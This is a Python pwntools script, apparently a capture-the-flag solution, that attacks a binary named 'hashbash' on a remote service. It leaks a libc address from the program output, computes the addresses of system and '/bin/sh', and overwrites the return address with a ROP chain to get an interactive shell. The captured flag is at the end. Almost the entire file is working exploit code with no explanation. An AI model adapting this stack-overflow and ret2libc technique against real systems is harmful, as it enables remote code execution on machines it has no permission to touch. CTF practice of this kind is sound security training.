#!/usr/env/bin python

from pwn import *


hashbash = ELF('./hashbash')
lib 	 = ELF('./libc.so.6-64')

def s2i(a):
    tmp = [a[i:i+2] for i in range(0, len(a), 2)]
    tmp = tmp[::-1]
    tmp = ''.join(tmp)
    return int(tmp,16)
def i2s(a):
    tmp = hex(a)[2:]
    tmp = [tmp[i:i+2] for i in range(0,len(tmp),2)]
    tmp = tmp[::-1]
    tmp = ''.join(tmp)
    tmp = tmp + '0' * (16 - len(tmp)) 
    return tmp

pop_rdi = 0x400ea3
pop_rsi_r15 = 0x400ea1

r = remote('192.168.31.25',44002)
#r = process('./hashbash')


# Step 1 : get return address
r.recvuntil('CMD: ')
r.send('\x0c'*9+'\n')
res = r.recvuntil('CMD: ')
res = r.recvuntil('CMD: ')
r.send('list\n')
res = r.recvuntil('CMD: ')
res = res.split('\n')

__libc_start_main = res[12][-16:]
__libc_start_main = s2i(__libc_start_main) - 245
lib_base = __libc_start_main - lib.symbols['__libc_start_main']
lib_sys = lib_base + lib.symbols['system']
lib_bin = lib_base + list(lib.search('/bin/sh'))[0]

print '__libc_start_main =',hex(__libc_start_main)
print 'lib_base =',hex(lib_base)
print 'lib_sys =',hex(lib_sys)
print 'lib_bin =',hex(lib_bin)

# Step 2 : change returnaddress and write payload
r.send('\x0b'*9+'\n')
res = r.recvuntil('CMD: ')
res = r.recvuntil('CMD: ')
r.send('add\n')
r.recvuntil('HASH: ')
r.send('00'*8 + i2s(pop_rdi) + '\n')

r.recvuntil('CMD: ')
r.send('\x0c'*9+'\n')
res = r.recvuntil('CMD: ')
res = r.recvuntil('CMD: ')
r.send('add\n')
r.recvuntil('HASH: ')
r.send(i2s(lib_bin) + i2s(lib_sys) + '\n')

# Step 3 : trigger payload
r.recvuntil('CMD: ')
r.send('exit\n')

r.interactive()
#AD{x64_st4ck_0v3flow_1s_mor3_difficult}
